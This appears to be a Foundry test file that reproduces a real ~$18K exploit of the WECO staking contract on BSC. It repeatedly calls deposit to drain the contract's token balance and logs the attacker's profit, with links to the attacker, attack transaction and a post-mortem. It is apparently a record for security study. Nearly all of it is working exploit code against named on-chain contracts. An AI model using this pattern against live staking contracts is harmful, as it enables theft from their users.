// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$18K
// Attacker : https://bscscan.com/address/0xf5f21746ff9351f16a42fa272d7707cc35760e4b
// Attack Contract : https://bscscan.com/address/0x76c8a674e814f5bd806fe6dd9975446a76056c1a
// Vulnerable Contract : https://bscscan.com/address/0xd672b766d66662f5c6fd798a999e1193a7945451
// Attack Tx : https://app.blocksec.com/explorer/tx/BSC/0x2040a481c933b50ee31aba257c2041c48bb7a0b4bf4b4fad1ac165f19c4269e8

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xd672b766d66662f5c6fd798a999e1193a7945451#code#L871
// https://bscscan.com/address/0xd672b766d66662f5c6fd798a999e1193a7945451#code#L599

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1725311048625041887
// Hacking God :

interface IWECOStaking {
    function deposit(uint256 _amount, uint256 _weeksLocked) external;
}

contract WECOExploit is Test {
    IWECOStaking private constant WECOStaking =
        IWECOStaking(0xd672b766D66662F5C6fd798a999e1193a7945451);
    IERC20 private constant WECOIN =
        IERC20(0x5d37ABAFd5498B0E7af753a2E83bd4F0335AA89F);

    uint256 private constant blocknumToForkFrom = 33_549_937;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(WECOStaking), "WECOStaking");
        vm.label(address(WECOIN), "WECOIN");
    }

    function testExploit() public {
        // Initial WECOIN balance. There was a transfer of WECOIN tokens from exploiter to attack contract
        // https://app.blocksec.com/explorer/tx/bsc/0x6129e18fdba3b4d3f1e6c3c9c448cafcbee5b5c82e4bbb69a404360f0e579051
        deal(address(WECOIN), address(this), 25_000_001 ether);
        uint256 WECOINBeforeBalance = WECOIN.balanceOf(address(this));
        WECOIN.approve(address(WECOStaking), type(uint256).max);
        WECOStaking.deposit(WECOIN.balanceOf(address(this)) - 1 ether, 0);
        uint256 WECOBalanceBeforeSecondDeposit = WECOIN.balanceOf(
            address(this)
        );
        WECOStaking.deposit(WECOIN.balanceOf(address(this)), 0);
        uint256 WECOBalanceAfterSecondDeposit = WECOIN.balanceOf(address(this));
        uint256 WECOStakingBalance = WECOIN.balanceOf(address(WECOStaking));

        uint256 i;
        while (
            i <
            WECOStakingBalance /
                (WECOBalanceAfterSecondDeposit - WECOBalanceBeforeSecondDeposit)
        ) {
            (bool success, ) = address(WECOStaking).call(
                abi.encodeCall(WECOStaking.deposit, (1 ether, 0))
            );
            if (success == false) {
                break;
            } else {
                ++i;
            }
        }
        emit log_named_decimal_uint(
            "Exploiter profit (in WECOIN) after attack",
            WECOIN.balanceOf(address(this)) - WECOINBeforeBalance,
            WECOIN.decimals()
        );
    }
}
